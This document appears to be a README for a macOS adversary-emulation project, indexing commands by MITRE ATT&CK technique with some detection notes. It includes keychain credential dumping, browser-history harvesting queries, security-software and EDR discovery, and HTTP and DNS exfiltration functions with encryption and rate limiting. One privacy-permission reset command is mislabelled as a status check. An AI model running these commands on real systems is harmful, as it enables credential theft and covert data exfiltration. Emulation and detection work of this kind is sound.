# Command Index 
<p>
  <span style="display: inline-block; padding: 5px 10px; background-color: #007bff; color: white; border-radius: 5px; font-size: 0.8em;">Good Stuff</span>
</br>
</p>

This document provides an index of commands used in our security scripts, organized by MITRE ATT&CK techniques. It serves as a quick reference for the various commands implemented across different scripts.


### Purpose
- To provide a centralized reference for all commands used in the project
- To map commands to their corresponding MITRE ATT&CK techniques
- To facilitate easier navigation and understanding of the project's capabilities

##

### Assumptions
- The reader has basic knowledge of MITRE ATT&CK framework
- The commands are intended for use on MacOS systems
- The listed commands are implemented in the corresponding scripts

##

### Usage
Refer to this document to:
- Quickly find commands related to specific MITRE ATT&CK techniques
- Understand the range of capabilities implemented in the project
- Locate the source scripts for specific commands

##

### Note
The commands listed here are for reference only. Always refer to the actual script implementations for the most up-to-date and context-specific usage of these commands.

##

### T1087.001 - Account Discovery: Local Account

**Source: accounts.sh**

| Description | Command |
|-------------|---------|
| List user directories | `ls -la /Users` |
| Enumerate local user accounts | `dscl . -list /Users` |
| Display passwd file content | `cat /etc/passwd` |
| Show current user's ID and groups | `id` |
| List logged-in users | `who` |
| Read login window preferences | `defaults read /Library/Preferences/com.apple.loginwindow` |
| Query user information | `dscacheutil -q user` |
| Query group information | `dscacheutil -q group` |
| List local groups | `dscl . -list /Groups` |
| Search group file | `grep /etc/group` |
| Display current user's group IDs | `id -G` |
| Show current user's group memberships | `groups` |

##

### T1555.001 - Credentials from Password Stores: Keychain

**Source: keychain.sh**

| Description | Command |
|-------------|---------|
| Dump login keychain contents | `security dump-keychain login.keychain` |
| Find generic password | `security find-generic-password -a "$ACCOUNT" -s "$SERVICE"` |
| Find internet password | `security find-internet-password -a "$ACCOUNT" -s "$SERVER"` |
| Find and print certificates | `security find-certificate -a -p` |
| Unlock login keychain | `security unlock-keychain login.keychain` |
| Export certificates in PEM format | `security export -k login.keychain -t certs -f pem -o "$OUTPUT_FILE"` |
| Find code signing identities | `security find-identity -v -p codesigning` |
| Extract readable strings from keychain | `strings ~/Library/Keychains/login.keychain-db` |
| Dump entire keychain database | `sqlite3 ~/Library/Keychains/login.keychain-db .dump` |

##

### T1518.001 - Security Software Discovery

**Source: security_software.sh**

| Description | Command |
|-------------|---------|
| List files in Applications directory | `ls -laR /Applications/` |
| List directories in Applications folder | `ls -d /Applications/` |
| List running processes | `ps -axrww \| grep -v grep \| grep --color=always` |
| Get detailed app information | `system_profiler SPApplicationsDataType \| grep --color=always -A 8` |
| Check Gatekeeper status | `spctl --status` |
| Assess app against Gatekeeper | `spctl --assess --verbose /Applications/Safari.app` |
| Check XProtect status | `system_profiler SPInstallHistoryDataType \| grep -A 5 "XProtect"` |
| Check MRT status | `system_profiler SPInstallHistoryDataType \| grep -A 5 "MRT"` |
| Check TCC status | `tccutil reset All` |
| Check for antivirus processes | `ps -axrww \| grep -v grep \| grep --color=always "MacKeeper\|Avast\|Avira\|Bitdefender\|ESET\|F-Secure\|Kaspersky\|McAfee\|Norton\|Panda\|Sophos\|Symantec\|Trend Micro\|Webroot\|Malwarebytes"` |
| Check for EDR processes | `ps -axrww \| grep -v grep \| grep --color=always "CrowdStrike\|Carbon Black\|SentinelOne\|Cylance\|FireEye\|Cisco AMP\|Palo Alto\|Microsoft Defender\|Trend Micro Apex One\|Sophos Intercept X"` |
| Check for Objective-See tools | `ps -axrww \| grep -v grep \| grep --color=always "BlockBlock\|DoNotDisturb\|LuLu\|KnockKnock\|OverSight\|RansomWhere"` |
| List antivirus app directories | `ls -d /Applications/*Antivirus*.app /Applications/*Security*.app /Applications/*Protect*.app 2>/dev/null` |
| List EDR app directories | `ls -d /Applications/CrowdStrike.app /Applications/Carbon\ Black.app /Applications/SentinelOne.app /Applications/Cylance.app /Applications/FireEye.app /Applications/Cisco\ AMP.app /Applications/Cortex\ XDR.app /Applications/Microsoft\ Defender.app /Applications/Trend\ Micro*.app /Applications/Sophos*.app 2>/dev/null` |
| List Objective-See tool directories | `ls -d /Applications/BlockBlock.app /Applications/DoNotDisturb.app /Applications/LuLu.app /Applications/KnockKnock.app /Applications/OverSight.app /Applications/RansomWhere.app 2>/dev/null` |
| Get antivirus app details | `system_profiler SPApplicationsDataType \| grep -A 8 -E "Antivirus\|Security\|Protect"` |
| Get EDR app details | `system_profiler SPApplicationsDataType \| grep -A 8 -E "CrowdStrike\|Carbon Black\|SentinelOne\|Cylance\|FireEye\|Cisco AMP\|Cortex XDR\|Microsoft Defender\|Trend Micro\|Sophos"` |
| Get Objective-See tool details | `system_profiler SPApplicationsDataType \| grep -A 8 -E "BlockBlock\|DoNotDisturb\|LuLu\|KnockKnock\|OverSight\|RansomWhere"` |

##

### T1136.001 - Create Account: Local Account

**Source: guest_account.sh**

| Description | Command |
|-------------|---------|
| Enable guest account | `sudo sysadminctl -guestAccount on` |
| Disable guest account | `sudo sysadminctl -guestAccount off` |

##

### T1033 - System Owner/User Discovery

**Source: shellbelt.sh**

| Description | Command |
|-------------|---------|
| Display current username | `whoami` |

##

### T1057 - Process Discovery

**Source: shellbelt.sh**

| Description | Command |
|-------------|---------|
| List all running processes | `ps -axrww \| grep -v grep \| grep --color=always` |

##

### T1217 - Browser Information Discovery

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Query Safari history | ```sqlite3 -separator '|' "$HOME/Library/Safari/History.db" "SELECT hi.domain_expansion as domain, hv.title, datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as visit_date, hi.url, hi.visit_count FROM history_items hi JOIN history_visits hv ON hi.id = hv.history_item WHERE hv.visit_time > (strftime('%s', 'now') - 978307200 - ($INPUT_DAYS * 86400)) ORDER BY hv.visit_time DESC"``` | File | File Access | Monitor for access to Safari history database |
| Query Chrome history | ```sqlite3 -separator '|' "$HOME/Library/Application Support/Google/Chrome/Default/History" "SELECT url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > (strftime('%s', 'now') - $INPUT_DAYS * 86400) * 1000000 ORDER BY last_visit_time DESC"``` | File | File Access | Monitor for access to Chrome history database |
| Query Firefox history | ```sqlite3 -separator '|' "$FIREFOX_PROFILE/places.sqlite" "SELECT url, title, datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as last_visit, visit_count FROM moz_places WHERE last_visit_date > (strftime('%s', 'now') - $INPUT_DAYS * 86400) * 1000000 ORDER BY last_visit_date DESC"``` | File | File Access | Monitor for access to Firefox history database |
| Query Brave history | ```sqlite3 -separator '|' "$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History" "SELECT url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > (strftime('%s', 'now') - $INPUT_DAYS * 86400) * 1000000 ORDER BY last_visit_time DESC"``` | File | File Access | Monitor for access to Brave history database |

## T1041 - Exfiltration Over C2 Channel

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Exfiltrate data via HTTP | `exfiltrate_http` | Network Traffic | Network Connection Creation | Monitor for unexpected outbound HTTP connections |
| Exfiltrate data via DNS | `exfiltrate_dns` | Network Traffic | Network Connection Creation | Monitor for unusual DNS queries or data patterns in DNS traffic |

## T1027 - Obfuscated Files or Information

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Encode output | `encode_output` | Process | Process Creation | Monitor for execution of encoding commands or libraries |
| Encrypt output | `encrypt_output` | Process | Process Creation | Monitor for execution of encryption commands or libraries |

## T1140 - Deobfuscate/Decode Files or Information

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Encode output | `encode_output` | Process | Process Creation | Monitor for execution of encoding/decoding commands or libraries |

## T1059.006 - Command and Scripting Interpreter: Python

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Encode output using Perl | ```perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'``` | Process | Process Creation | Monitor for execution of Perl with encoding commands |

### T1046 - Network Service Discovery

**Source: [network_service.sh](../../ttp/discovery/network_service.sh)**

| Description | Command | Data Source | Data Component | Detections |
|-------------|---------|-------------|----------------|------------|
| List network services | `launchctl list \| grep -i "net\|web\|ftp\|ssh\|smb\|afp"` | Process | Process Creation | Monitor for launchctl list commands |
| Network service states | `scutil --nc list` | Process | Process Creation | Monitor for scutil network commands |
| Bonjour service discovery | `dns-sd -B _service._tcp .` | Process | Process Creation | Monitor for dns-sd commands |
| mDNS service status | `ps aux \| grep mDNSResponder` | Process | Process Creation | Monitor for mDNS process queries |
| Network memory analysis | `vmmap $PID \| grep -iE 'network\|socket'` | Process | Process Creation | Monitor for vmmap commands |
| Network connections | `lsof -i -n -P` | Process | Process Creation | Monitor for lsof network commands |
| Network syscalls | `dtrace -n 'syscall::socket*:entry'` | Process | Process Creation | Monitor for dtrace network syscall tracing |
| Network shares | `mdfind 'kMDItemFSType == "smbfs"'` | Process | Process Creation | Monitor for mdfind network share queries |
| Sharing services | `sharing -l` | Process | Process Creation | Monitor for sharing command usage |
| Network routes | `route -n get default` | Process | Process Creation | Monitor for route command usage |
| ARP cache | `arp -a` | Process | Process Creation | Monitor for arp command usage |
| Network quality | `networkQuality -v` | Process | Process Creation | Monitor for networkQuality command usage |

## Script Organization

### 1. Script Structure
1. Header with metadata
2. Configuration section
3. Global variables
4. Function definitions
5. Main execution flow
6. Argument parsing
7. Feature execution
8. Output handling

### 2. Core Components

#### 2.1 Initialization
- Command validation
- Permission checking
- Argument parsing
- Feature flag setup
- Logging initialization
- Job ID generation

#### 2.2 Data Collection
- Input validation
- Data gathering
- Data processing
- Error handling

#### 2.3 Output Processing
- Format selection
- Data formatting
- Encoding
- Encryption
- Metadata addition

#### 2.4 Exfiltration
- Method selection
- Key transmission
- Data chunking
- Rate limiting
- Transmission

### 3. Common Procedures

#### 3.1 Permission Handling
```sh
# Check file permissions
check_perms "$file" "r"

# Check TCC/FDA access
check_perms_tcc
```

#### 3.2 Command Validation
```sh
# Validate required commands
validate_commands

# Check specific command
command -v "$cmd" >/dev/null 2>&1
```

#### 3.3 Data Processing
```sh
# Format output
format_output "$data"

# Chunk data
chunk_data "$data" 63

# Encode data
encode_output "$data"
```

#### 3.4 Encryption
```sh
# Generate key
key=$(generate_random_key)

# Encrypt data
encrypted=$(encrypt_data "$data" "$method" "$key")

# Prepare encryption
prepare_encryption "$method"
```

#### 3.5 Exfiltration
```sh
# HTTP exfiltration
exfiltrate_http "$data" "$url"

# DNS exfiltration
exfiltrate_dns "$data" "$domain" "$id"

# Rate limiting
rate_limit
```

### 4. Error Handling

#### 4.1 Function Level
```sh
function_name() {
    local result
    result=$(command) || {
        debug_print "Error: Command failed"
        return 1
    }
    echo "$result"
}
```

#### 4.2 Command Level
```sh
if ! command_name args; then
    debug_print "Error: Command failed"
    return 1
fi
```

#### 4.3 Data Validation
```sh
validate_input "$input" || {
    debug_print "Error: Invalid input"
    return 1
}
```

### 5. Logging

#### 5.1 Debug Output
```sh
[ "$DEBUG" = true ] && debug_print "Debug message"
```

#### 5.2 Log Entry
```sh
log_output "$output" "$status" "$skip_data"
```

#### 5.3 Error Logging
```sh
debug_print "Error: $error_message"
```

### 6. Feature Control

#### 6.1 Feature Flags
```sh
# Enable feature
FEATURE_FLAG=true

# Check feature
if [ "$FEATURE_FLAG" = true ]; then
    execute_feature
fi
```

#### 6.2 Feature Options
```sh
# Set option
FEATURE_OPTION="value"

# Use option
if [ -n "$FEATURE_OPTION" ]; then
    use_option "$FEATURE_OPTION"
fi
```

### 7. Job Control

#### 7.1 Job Tracking
```sh
# Generate job ID
JOB_ID=$(generate_job_id)

# Track status
SCRIPT_STATUS="running"
```

#### 7.2 Process Info
```sh
# Get process info
OWNER="$USER"
PARENT_PROCESS="$(ps -p $PPID -o comm=)"
```

### 8. Output Formats

#### 8.1 JSON
```sh
format_json() {
    jq -c '.' <<< "$1"
}
```

#### 8.2 CSV
```sh
format_csv() {
    awk -F'|' 'BEGIN{OFS=","} {print $1,$2,$3}' <<< "$1"
}
```

#### 8.3 Raw
```sh
format_raw() {
    awk '!seen[$0]++' <<< "$1"
}
```

### 9. Encoding Methods

#### 9.1 Base64
```sh
encode_base64() {
    base64 <<< "$1"
}
```

#### 9.2 Hex
```sh
encode_hex() {
    xxd -p <<< "$1"
}
```

### 10. Encryption Methods

#### 10.1 AES
```sh
encrypt_aes() {
    openssl enc -e -aes-256-cbc -base64 -k "$2" <<< "$1"
}
```

#### 10.2 GPG
```sh
encrypt_gpg() {
    gpg --batch --yes --passphrase "$2" --symmetric --cipher-algo AES256 <<< "$1"
}
```

### 11. Exfiltration Methods

#### 11.1 HTTP
```sh
exfiltrate_http() {
    curl -s -X POST "$2" -d "$1"
}
```

#### 11.2 DNS
```sh
exfiltrate_dns() {
    dig "@$2" "$(encode_input "$1").$3" +short
}
```

### 12. Rate Limiting

#### 12.1 Simple Delay
```sh
rate_limit() {
    sleep 0.1
}
```

#### 12.2 Progressive Delay
```sh
rate_limit_progressive() {
    sleep "$((RANDOM % 3 + 1))"
}
```

### 13. Input Validation

#### 13.1 Pattern Matching
```sh
validate_pattern() {
    [[ "$1" =~ ^[a-zA-Z0-9_-]+$ ]]
}
```

#### 13.2 Sanitization
```sh
sanitize_input() {
    sed 's/[^a-zA-Z0-9_-]//g' <<< "$1"
}
```

### 14. Help Display

#### 14.1 Basic Help
```sh
display_help() {
    cat << EOF
Usage: $0 [options]
Options:
  -h, --help    Show this help
EOF
}
```

#### 14.2 Extended Help
```sh
display_extended_help() {
    display_help
    cat << EOF
Examples:
  $0 --feature value
  $0 --all
EOF
}
```


